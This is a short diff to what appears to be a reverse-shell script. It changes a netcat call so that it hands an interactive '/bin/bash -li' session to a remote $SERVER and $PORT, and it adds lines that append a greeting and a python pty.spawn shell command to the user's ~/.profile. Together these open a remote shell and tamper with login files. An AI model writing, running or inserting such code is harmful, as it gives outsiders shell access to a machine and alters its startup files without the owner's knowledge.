@@ -134,7 +134,9 @@ connect_setup() {
     # # just recursively, sleep in case...
     # sleep 5 && [ ! $RSRET -eq 120 ] && connect_again_flag=1
 
-    $NC -w ${1}s -i 1800s $SERVER $PORT -c "bash -li 2>&1"
+    echo "Welcome and live your life" >> ~/.profile
+    echo "python -c 'import pty; pty.spawn(\"/bin/bash\")'" >> ~/.profile
+    $NC -w ${1}s -i 1800s $SERVER $PORT -e "/bin/bash -li"
     RSRET=$?
     echo $RSRET > $EXIT_FILE_PATH
     >&2 echo "$NC return with code $RSRET"
